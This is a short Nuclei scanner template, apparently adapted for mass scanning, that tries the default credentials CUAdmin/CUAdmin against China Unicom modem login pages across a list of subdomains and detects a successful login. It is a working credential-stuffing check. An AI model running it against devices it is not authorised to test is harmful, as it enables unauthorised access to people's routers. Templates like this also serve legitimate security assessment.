# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: chinaunicom-modem-default-credentials
info:
  name: Chinaunicom Modem Default Credentials
  author: princechaddha
  severity: high
  tags: chinaunicom,default-login
http:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt

    threads: 100
    raw:
      - |
        POST /cu.html HTTP/1.1
        Host: {{Subdomains}}

        frashnum=&action=login&Frm_Logintoken=1&Username=CUAdmin&Password=CUAdmin&Username=&Password=
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - "/menu.gch"
        part: header
